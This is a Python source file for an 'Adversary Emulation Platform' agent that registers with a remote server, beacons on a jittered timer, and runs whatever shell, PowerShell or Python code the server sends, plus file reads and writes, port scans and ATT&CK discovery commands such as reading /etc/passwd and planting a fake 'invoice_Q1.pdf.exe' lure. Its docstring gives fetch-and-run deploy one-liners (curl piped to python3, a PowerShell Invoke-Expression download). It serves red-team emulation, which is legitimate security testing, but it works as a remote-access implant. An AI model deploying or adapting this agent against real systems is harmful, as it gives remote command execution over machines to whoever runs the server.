#!/usr/bin/env python3
"""
AEP Agent — Adversary Emulation Platform Agent
==============================================
Deploy ke target machine, beacon ke AEP server, eksekusi teknik ATT&CK.

Fitur:
  - Auto-register ke AEP server saat startup
  - Beacon loop periodik (interval konfigurasi)
  - Eksekusi: shell command, PowerShell, Python snippet, teknik simulasi
  - Report hasil eksekusi kembali ke server
  - Cross-platform: Windows + Linux + macOS

Usage:
  python aep_agent.py --server http://10.0.0.1:8000
  python aep_agent.py --server http://10.0.0.1:8000 --interval 30 --type windows
  python aep_agent.py --server http://10.0.0.1:8000 --campaign-id <id> --name red-01

Quick deploy (Windows PowerShell):
  Invoke-Expression (Invoke-WebRequest http://10.0.0.1:8000/agent.py -UseBasicParsing).Content

Quick deploy (Linux/macOS Bash):
  curl -s http://10.0.0.1:8000/agent.py | python3
"""

import argparse
import json
import os
import platform
import socket
import struct
import subprocess
import sys
import time
import traceback
import urllib.error
import urllib.request
import uuid
from datetime import datetime

# ─── Config ───────────────────────────────────────────────────────────────────

VERSION = "1.0.0"
DEFAULT_INTERVAL = 60       # seconds between beacons
DEFAULT_SERVER   = "http://localhost:8000"
DEFAULT_JITTER   = 0.2      # ±20% jitter on beacon interval


# ─── HTTP Helpers ─────────────────────────────────────────────────────────────

def _request(url: str, method: str = "GET", data: dict | None = None, timeout: int = 15) -> dict:
    """Minimal HTTP client using stdlib — no external deps."""
    body = json.dumps(data).encode() if data else None
    req  = urllib.request.Request(
        url, data=body, method=method,
        headers={"Content-Type": "application/json", "User-Agent": f"aep-agent/{VERSION}"},
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            raw = resp.read().decode()
            return json.loads(raw) if raw else {}
    except urllib.error.HTTPError as e:
        raw = e.read().decode()
        try:
            err = json.loads(raw)
        except Exception:
            err = {"detail": raw or str(e)}
        raise RuntimeError(f"HTTP {e.code}: {err.get('detail', raw)}")


def api(server: str, path: str, method: str = "GET", data: dict | None = None) -> dict:
    return _request(f"{server}/api/v1{path}", method=method, data=data)


# ─── System Info ──────────────────────────────────────────────────────────────

def get_system_info() -> dict:
    info = {
        "platform":       platform.system(),
        "platform_version": platform.version(),
        "machine":        platform.machine(),
        "processor":      platform.processor(),
        "python_version": sys.version,
        "hostname":       socket.gethostname(),
        "pid":            os.getpid(),
    }
    try:
        import psutil
        info["cpu_count"]   = psutil.cpu_count()
        info["memory_total_gb"] = round(psutil.virtual_memory().total / 1024**3, 2)
    except ImportError:
        pass
    return info


def detect_os_type() -> str:
    s = platform.system().lower()
    if "windows" in s:
        return "windows"
    if "linux" in s:
        return "linux"
    if "darwin" in s:
        return "macos"
    return "unknown"


def get_local_ip() -> str:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
    except Exception:
        return "127.0.0.1"


def get_privilege_level() -> str:
    try:
        if platform.system() == "Windows":
            import ctypes
            return "admin" if ctypes.windll.shell32.IsUserAnAdmin() else "user"
        else:
            return "root" if os.geteuid() == 0 else "user"
    except Exception:
        return "user"


def get_capabilities() -> list[str]:
    caps = ["shell", "file_ops", "process_enum", "network_scan"]
    if platform.system() == "Windows":
        caps += ["powershell", "registry_read", "wmi"]
    else:
        caps += ["bash", "cron_persistence"]
    try:
        import subprocess
        subprocess.run(["python3", "--version"], capture_output=True, timeout=3)
        caps.append("python_exec")
    except Exception:
        pass
    return caps


# ─── Task Execution ───────────────────────────────────────────────────────────

class TaskExecutor:
    """Execute tasks assigned by the AEP server."""

    def run(self, task: dict) -> dict:
        task_type  = task.get("task_type", "shell_command")
        # Server sends "task_params"; also accept "params" alias
        params     = task.get("task_params") or task.get("params", {})
        technique  = task.get("technique_id", "")

        print(f"  [*] Executing task type={task_type} technique={technique}")

        try:
            if task_type == "shell_command":
                return self._shell(params)
            elif task_type == "powershell":
                return self._powershell(params)
            elif task_type == "python_exec":
                return self._python_exec(params)
            elif task_type == "file_write":
                return self._file_write(params)
            elif task_type == "file_read":
                return self._file_read(params)
            elif task_type == "process_enum":
                return self._process_enum()
            elif task_type == "network_scan":
                return self._network_scan(params)
            elif task_type == "execute_technique":
                return self._simulate_technique(technique, params)
            else:
                return {"status": "failed", "output": "", "error": f"Unknown task type: {task_type}"}
        except Exception as ex:
            return {"status": "failed", "output": "", "error": str(ex)}

    # ── Shell / PowerShell ────────────────────────────────────────────────────

    def _shell(self, params: dict) -> dict:
        cmd     = params.get("command", "whoami")
        timeout = params.get("timeout", 30)
        shell   = platform.system() == "Windows"
        try:
            result = subprocess.run(
                cmd, shell=True, capture_output=True, text=True, timeout=timeout
            )
            output = result.stdout + result.stderr
            status = "success" if result.returncode == 0 else "failed"
            return {"status": status, "output": output.strip(), "error": "", "return_code": result.returncode}
        except subprocess.TimeoutExpired:
            return {"status": "timeout", "output": "", "error": "Command timed out"}

    def _powershell(self, params: dict) -> dict:
        if platform.system() != "Windows":
            # Try pwsh on Linux/macOS
            pwsh = "pwsh"
        else:
            pwsh = "powershell.exe"

        script  = params.get("script", "Get-Date")
        timeout = params.get("timeout", 30)
        try:
            result = subprocess.run(
                [pwsh, "-NonInteractive", "-NoProfile", "-Command", script],
                capture_output=True, text=True, timeout=timeout
            )
            output = result.stdout + result.stderr
            status = "success" if result.returncode == 0 else "failed"
            return {"status": status, "output": output.strip(), "error": "", "return_code": result.returncode}
        except subprocess.TimeoutExpired:
            return {"status": "timeout", "output": "", "error": "PowerShell timed out"}
        except FileNotFoundError:
            return {"status": "failed", "output": "", "error": "PowerShell not found on this system"}

    def _python_exec(self, params: dict) -> dict:
        code    = params.get("code", "print('hello')")
        timeout = params.get("timeout", 30)
        try:
            result = subprocess.run(
                [sys.executable, "-c", code],
                capture_output=True, text=True, timeout=timeout
            )
            return {"status": "success" if result.returncode == 0 else "failed",
                    "output": (result.stdout + result.stderr).strip(), "error": ""}
        except subprocess.TimeoutExpired:
            return {"status": "timeout", "output": "", "error": "Python exec timed out"}

    # ── File Ops ──────────────────────────────────────────────────────────────

    def _file_write(self, params: dict) -> dict:
        path    = params.get("path", "/tmp/aep_test.txt")
        content = params.get("content", "AEP test file")
        try:
            with open(path, "w") as f:
                f.write(content)
            return {"status": "success", "output": f"Written {len(content)} bytes to {path}", "error": ""}
        except Exception as ex:
            return {"status": "failed", "output": "", "error": str(ex)}

    def _file_read(self, params: dict) -> dict:
        path  = params.get("path", "/etc/hostname")
        limit = params.get("limit", 4096)
        try:
            with open(path, "r", errors="replace") as f:
                content = f.read(limit)
            return {"status": "success", "output": content, "error": ""}
        except Exception as ex:
            return {"status": "failed", "output": "", "error": str(ex)}

    # ── Recon ─────────────────────────────────────────────────────────────────

    def _process_enum(self) -> dict:
        try:
            if platform.system() == "Windows":
                result = subprocess.run(["tasklist"], capture_output=True, text=True, timeout=10)
            else:
                result = subprocess.run(["ps", "aux"], capture_output=True, text=True, timeout=10)
            return {"status": "success", "output": result.stdout[:4096], "error": ""}
        except Exception as ex:
            return {"status": "failed", "output": "", "error": str(ex)}

    def _network_scan(self, params: dict) -> dict:
        target = params.get("target", "127.0.0.1")
        ports  = params.get("ports", [22, 80, 443, 445, 3389, 8080])
        open_ports = []
        for port in ports:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(1)
                    if s.connect_ex((target, port)) == 0:
                        open_ports.append(port)
            except Exception:
                pass
        output = f"Target: {target}\nOpen ports: {open_ports}" if open_ports else f"Target: {target}\nNo open ports found in {ports}"
        return {"status": "success", "output": output, "error": "", "collected_data": {"open_ports": open_ports, "target": target}}

    # ── Technique Simulation ──────────────────────────────────────────────────

    def _simulate_technique(self, technique_id: str, params: dict) -> dict:
        """
        Simulate ATT&CK technique execution on the actual host.
        Each technique runs a lightweight simulation appropriate for the TID.
        """
        tid = technique_id.upper()

        # T1033 — System Owner/User Discovery
        if tid == "T1033":
            return self._shell({"command": "whoami /all" if platform.system() == "Windows" else "id && who"})

        # T1057 — Process Discovery
        if tid == "T1057":
            return self._process_enum()

        # T1082 — System Information Discovery
        if tid == "T1082":
            cmd = "systeminfo" if platform.system() == "Windows" else "uname -a && cat /etc/os-release 2>/dev/null"
            return self._shell({"command": cmd})

        # T1049 — System Network Connections Discovery
        if tid == "T1049":
            cmd = "netstat -an" if platform.system() == "Windows" else "ss -tuln"
            return self._shell({"command": cmd})

        # T1016 — System Network Configuration Discovery
        if tid == "T1016":
            cmd = "ipconfig /all" if platform.system() == "Windows" else "ip addr && ip route"
            return self._shell({"command": cmd})

        # T1046 — Network Service Discovery
        if tid == "T1046":
            target = params.get("target", "127.0.0.1")
            return self._network_scan({"target": target, "ports": [21,22,23,25,80,443,445,3389,8080,8443]})

        # T1083 — File and Directory Discovery
        if tid == "T1083":
            cmd = "dir C:\\ /s /b | head -50" if platform.system() == "Windows" else "ls -la /home /tmp /var/www 2>/dev/null | head -50"
            return self._shell({"command": cmd})

        # T1105 — Ingress Tool Transfer (simulate with harmless file write)
        if tid == "T1105":
            path = params.get("drop_path", "/tmp/aep_probe.txt" if platform.system() != "Windows" else "C:\\Temp\\aep_probe.txt")
            return self._file_write({"path": path, "content": f"AEP probe — {datetime.utcnow().isoformat()}\n"})

        # T1059.001 — PowerShell
        if tid in ("T1059", "T1059.001"):
            return self._powershell({"script": "Get-Date; Get-Host; $env:USERNAME"})

        # T1059.004 — Unix Shell
        if tid == "T1059.004":
            return self._shell({"command": "bash -c 'echo AEP_shell_test; id; uname -a'"})

        # T1566 — Phishing (simulate file creation as lure)
        if tid.startswith("T1566"):
            path = "/tmp/invoice_Q1.pdf.exe" if platform.system() != "Windows" else "C:\\Temp\\invoice_Q1.pdf.exe"
            result = self._file_write({"path": path, "content": "[AEP simulation — phishing lure artifact]"})
            result["output"] = f"[SIMULATION] Phishing lure created at: {path}\n" + result.get("output", "")
            return result

        # T1078 — Valid Accounts
        if tid == "T1078":
            cmd = "net user" if platform.system() == "Windows" else "cat /etc/passwd | grep -v nologin | grep -v false | head -20"
            return self._shell({"command": cmd})

        # Default: whoami + hostname
        cmd = "whoami && hostname && echo [AEP simulation: technique {tid}]".replace("{tid}", tid)
        result = self._shell({"command": cmd})
        result["output"] = f"[SIMULATION] Technique {tid}\n" + result.get("output", "")
        return result


# ─── Agent Core ───────────────────────────────────────────────────────────────

class AEPAgent:
    def __init__(self, server: str, agent_type: str, interval: int,
                 campaign_id: str | None, name: str):
        self.server      = server.rstrip("/")
        self.agent_type  = agent_type
        self.interval    = interval
        self.campaign_id = campaign_id
        self.name        = name
        self.agent_id    = None
        self.token       = None
        self.executor    = TaskExecutor()

    # ── Registration ──────────────────────────────────────────────────────────

    def register(self) -> bool:
        hostname = socket.gethostname()
        ip       = get_local_ip()
        os_type  = detect_os_type()

        print(f"[*] Registering agent to {self.server}")
        print(f"    hostname    : {hostname}")
        print(f"    ip_address  : {ip}")
        print(f"    os_type     : {os_type}")
        print(f"    agent_type  : {self.agent_type}")
        print(f"    privilege   : {get_privilege_level()}")

        payload = {
            "hostname":        hostname,
            "ip_address":      ip,
            "os_type":         os_type,
            "os_version":      platform.version()[:100],
            "arch":            platform.machine(),
            "agent_type":      self.agent_type,
            "agent_name":      self.name,
            "agent_version":   VERSION,
            "capabilities":    get_capabilities(),
            "privilege_level": get_privilege_level(),
            "beacon_interval": self.interval,
        }
        if self.campaign_id:
            payload["campaign_id"] = self.campaign_id

        try:
            resp = api(self.server, "/agents/register", method="POST", data=payload)
            self.agent_id = resp["agent"]["id"]
            self.token    = resp["agent"]["token"]
            print(f"[+] Registered! agent_id = {self.agent_id}")
            print(f"    Token (save this): {self.token}")
            return True
        except Exception as ex:
            print(f"[-] Registration failed: {ex}")
            return False

    # ── Beacon Loop ───────────────────────────────────────────────────────────

    def beacon(self) -> list[dict]:
        """Check-in to server, return pending tasks."""
        sysinfo = get_system_info()
        payload = {
            "token":                self.token,
            "system_info":          sysinfo,
            "current_tasks_running": 0,
        }
        try:
            resp  = api(self.server, f"/agents/{self.agent_id}/checkin", method="POST", data=payload)
            # Server returns "tasks" and "pending_tasks" (alias) — accept both
            tasks = resp.get("pending_tasks") or resp.get("tasks", [])
            print(f"[>] Beacon OK — {len(tasks)} pending task(s)")
            return tasks
        except Exception as ex:
            print(f"[!] Beacon failed: {ex}")
            return []

    # ── Task Execution + Reporting ────────────────────────────────────────────

    def execute_and_report(self, task: dict) -> None:
        task_id    = task.get("id") or task.get("task_id")
        task_type  = task.get("task_type", "unknown")
        technique  = task.get("technique_id", "")

        print(f"\n[*] Task {task_id} — {task_type} / {technique}")
        start = time.time()

        result      = self.executor.run(task)
        elapsed     = time.time() - start
        r_status    = result.get("status", "failed")
        output      = result.get("output", "")
        error       = result.get("error", "")
        collected   = result.get("collected_data", {})

        print(f"    Status  : {r_status} ({elapsed:.1f}s)")
        if output:
            print("    Output  :")
            for line in output.splitlines()[:10]:
                print(f"              {line}")
            if len(output.splitlines()) > 10:
                print(f"              … ({len(output.splitlines())} lines total)")

        # Report result back to server
        report = {
            "token":        self.token,
            "result_status": r_status if r_status in ("success","failed","partial","timeout") else "failed",
            "output":       output[:8000],
            "error":        error[:2000],
            "artifacts":    [],
            "collected_data": collected,
        }
        try:
            api(self.server, f"/agents/{self.agent_id}/tasks/{task_id}/result",
                method="POST", data=report)
            print(f"    Reported: OK")
        except Exception as ex:
            print(f"    Reported: FAILED ({ex})")

    # ── Main Loop ─────────────────────────────────────────────────────────────

    def run(self) -> None:
        print(f"\n{'='*55}")
        print(f"  AEP Agent v{VERSION}")
        print(f"  Server : {self.server}")
        print(f"  Beacon : {self.interval}s interval")
        print(f"{'='*55}\n")

        if not self.register():
            print("[-] Cannot register. Exiting.")
            sys.exit(1)

        print(f"\n[+] Entering beacon loop (Ctrl+C to stop)…\n")

        while True:
            try:
                tasks = self.beacon()
                for task in tasks:
                    self.execute_and_report(task)
            except KeyboardInterrupt:
                print("\n[!] Stopping agent.")
                break
            except Exception as ex:
                print(f"[!] Loop error: {ex}")

            # Sleep with jitter (±20%)
            import random
            jitter  = random.uniform(-DEFAULT_JITTER, DEFAULT_JITTER)
            sleep_t = max(10, self.interval * (1 + jitter))
            print(f"\n[.] Sleeping {sleep_t:.0f}s…\n")
            time.sleep(sleep_t)


# ─── Entry Point ──────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="AEP Agent — Adversary Emulation Platform",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    parser.add_argument("--server",      default=DEFAULT_SERVER,  help="AEP server URL")
    parser.add_argument("--interval",    type=int, default=DEFAULT_INTERVAL, help="Beacon interval in seconds (default: 60)")
    parser.add_argument("--type",        choices=["it","ot"],     default="it", help="Agent type: it (Enterprise) or ot (ICS/OT)")
    parser.add_argument("--campaign-id", default=None,            help="Attach to specific campaign ID")
    parser.add_argument("--name",        default="aep-agent",     help="Agent display name")
    args = parser.parse_args()

    agent = AEPAgent(
        server      = args.server,
        agent_type  = args.type,
        interval    = args.interval,
        campaign_id = args.campaign_id,
        name        = args.name,
    )
    agent.run()


if __name__ == "__main__":
    main()
